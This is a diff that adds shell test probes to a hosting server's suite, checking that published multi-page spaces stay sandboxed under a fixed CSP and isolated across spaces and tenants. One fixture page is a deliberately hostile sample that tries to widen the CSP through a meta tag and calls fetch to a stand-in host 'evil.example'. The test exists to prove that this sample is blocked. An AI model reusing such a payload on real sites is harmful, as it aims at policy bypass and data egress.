@@ -338,6 +338,81 @@ grep -q '"live":"sse"' "$WORK/sse_live.txt"; scheck $? "sse: a submission landin
 # a sandboxed artifact (connect-src 'none', no allow-forms) can never reach the stream.
 ! echo "$HCSP1" | grep -q "submissions/stream"; scheck $? "sse: the artifact CSP never names the stream path (artifact cannot reach it)"
 
+# ---------------------------------------------------------------------------
+# Gap 1 — multi-page hosted publish (space ingest). A whole SPACE (a directory of
+# linked .html artifacts) is published into ONE hosted namespace /p/<slug>/… . The
+# gate here: every page of the space stays a null-origin sandboxed iframe under the
+# FROZEN artifact CSP (a hostile page in the bundle cannot widen it), in-space nav
+# addresses only sibling pages of the SAME space slug, and cross-space / cross-tenant
+# isolation holds (a page slug is never a top-level space; another tenant cannot
+# update-in-place a space it does not own). Reuses the running host server (acme/globex).
+# ---------------------------------------------------------------------------
+echo "==> Running Gap 1 space-ingest probes"
+# A bundle: two fragment pages that relative-link to each other, plus a HOSTILE page
+# whose body tries to widen the CSP via <meta>, plus a small asset (base64).
+LOGO_B64="$(printf '<svg xmlns="http://www.w3.org/2000/svg"></svg>' | base64 | tr -d '\n')"
+cat > "$WORK/space.json" <<JSON
+{ "pages": [
+    { "slug": "index", "html": "<title>Home</title><h1>Home</h1><a href=\"./guide\">guide</a>" },
+    { "slug": "guide", "html": "<h1>Guide</h1><a href=\"./index\">home</a><img src=\"./assets/logo.svg\">" },
+    { "slug": "evil", "html": "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\"><script>fetch('http://evil.example/x')</script><h1>x</h1>" }
+  ],
+  "assets": [ { "path": "logo.svg", "content_base64": "$LOGO_B64" } ],
+  "nav": ["index","guide","evil"], "title": "Docs", "space_key": "docsite" }
+JSON
+SPUB="$(curl -s -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYA" \
+  -H 'content-type: application/json' -d @"$WORK/space.json")"
+SPSLUG="$(printf '%s' "$SPUB" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
+[ -n "$SPSLUG" ]; scheck $? "space: a multi-page space is published under one namespace"
+printf '%s' "$SPUB" | grep -q '"page_count":3'; scheck $? "space: the ingest envelope reports all pages"
+
+# Every page serves under the FROZEN artifact CSP — the hostile page cannot widen it.
+for PG in index guide evil; do
+  PGCSP="$(hdr "$HOST_ORIGIN/p/$SPSLUG/_c/$PG" content-security-policy)"
+  echo "$PGCSP" | grep -q "connect-src 'none';"; scheck $? "space: page '$PG' keeps connect-src 'none' (egress closed)"
+  ! echo "$PGCSP" | grep -q "allow-forms"; scheck $? "space: page '$PG' sandbox has NO allow-forms (airlock held)"
+done
+EVILCSP="$(hdr "$HOST_ORIGIN/p/$SPSLUG/_c/evil" content-security-policy)"
+echo "$EVILCSP" | grep -q "sandbox allow-scripts"; scheck $? "space: a hostile bundle page stays sandboxed (server CSP authoritative)"
+! echo "$EVILCSP" | grep -q "default-src \*"; scheck $? "space: a hostile page's <meta> cannot widen the response CSP"
+
+# In-space relative links resolve to SIBLING pages of the same space (served body
+# keeps the relative href; the bridge/nav only knows this space's slugs).
+curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q 'href="./guide"'; scheck $? "space: an in-space relative link is preserved for same-space nav"
+# The asset serves under the space namespace with its detected MIME.
+[ "$(hdr "$HOST_ORIGIN/p/$SPSLUG/assets/logo.svg" content-type)" = "image/svg+xml" ]; scheck $? "space: a space asset serves under /p/<space>/assets with correct MIME"
+
+# CROSS-SPACE ISOLATION: a page slug is reachable ONLY under its own space, never as
+# a top-level space of its own; a bogus space slug is an opaque 404.
+[ "$(curl -s -o /dev/null -w '%{http_code}' "$HOST_ORIGIN/p/guide/_c/index")" = "404" ]; scheck $? "space: a page slug is NOT addressable as a top-level space (no cross-space escape)"
+[ "$(curl -s -o /dev/null -w '%{http_code}' "$HOST_ORIGIN/p/zzzzzzzzzzzzzzzzzzzzzzzzzz/_c/index")" = "404" ]; scheck $? "space: an unknown space slug is an opaque 404"
+
+# STABLE KEY updates in place (same slug, 200) — a re-publish reflects new content.
+cat > "$WORK/space2.json" <<JSON
+{ "pages": [ { "slug": "index", "html": "<title>Home</title><h1>Home v2</h1>" } ], "space_key": "docsite" }
+JSON
+SPUB2="$(curl -s -w '\n%{http_code}' -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYA" \
+  -H 'content-type: application/json' -d @"$WORK/space2.json")"
+echo "$SPUB2" | tail -1 | grep -q '200'; scheck $? "space: a re-publish with the same --space-key returns 200 (update in place)"
+SPSLUG2="$(printf '%s' "$SPUB2" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
+[ "$SPSLUG2" = "$SPSLUG" ]; scheck $? "space: the in-place update kept the same slug/URL"
+curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q "Home v2"; scheck $? "space: the in-place update swapped the served content"
+
+# CROSS-TENANT: globex using the SAME stable key gets its OWN space (a tenant can
+# never update-in-place another tenant's space).
+cat > "$WORK/space_b.json" <<JSON
+{ "pages": [ { "slug": "index", "html": "<h1>globex</h1>" } ], "space_key": "docsite" }
+JSON
+GPUB="$(curl -s -X POST "$HOST_ORIGIN/api/v1/spaces" -H "Authorization: Bearer $KEYB" \
+  -H 'content-type: application/json' -d @"$WORK/space_b.json")"
+GSLUG="$(printf '%s' "$GPUB" | sed -n 's/.*"slug":"\([a-z0-9]*\)".*/\1/p')"
+[ -n "$GSLUG" ] && [ "$GSLUG" != "$SPSLUG" ]; scheck $? "space: the same key under a different tenant yields a DISTINCT space (per-tenant scope)"
+# acme's space is unchanged by globex's publish.
+curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q "Home v2"; scheck $? "space: a cross-tenant publish left the owner's space untouched"
+
+# Space ingest requires auth (fail-closed), same as single-page ingest.
+[ "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST_ORIGIN/api/v1/spaces" -H 'content-type: application/json' -d '{"pages":[{"slug":"index","html":"x"}]}')" = "401" ]; scheck $? "space: an unauthenticated space publish is rejected (401)"
+
 kill "$HOST_PID" 2>/dev/null || true
 sleep 0.3
 
